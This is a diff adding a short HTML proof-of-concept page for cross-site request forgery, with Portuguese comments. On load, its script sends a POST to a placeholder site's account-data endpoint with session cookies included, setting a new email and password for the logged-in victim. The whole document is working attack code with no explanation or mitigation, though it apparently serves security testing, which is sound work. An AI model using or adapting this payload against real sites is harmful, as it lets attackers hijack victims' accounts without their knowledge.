@@ -1,0 +1,18 @@
+<!-- csrf-via-fetch.html -->
+<html>
+  <body>
+    <script>
+      const formData = new FormData();
+      formData.append("acao", "site/meus-dados");
+      formData.append("email", "csrf@teste.com");
+      formData.append("senha", "TestandoCSRF123!");
+      // ...adicione outros campos
+
+      fetch("https://www.site.com/api/site/meus-dados", {
+        method: "POST",
+        credentials: "include", // envia os cookies de sessão
+        body: formData
+      }).then(res => console.log("CSRF enviado:", res));
+    </script>
+  </body>
+</html>
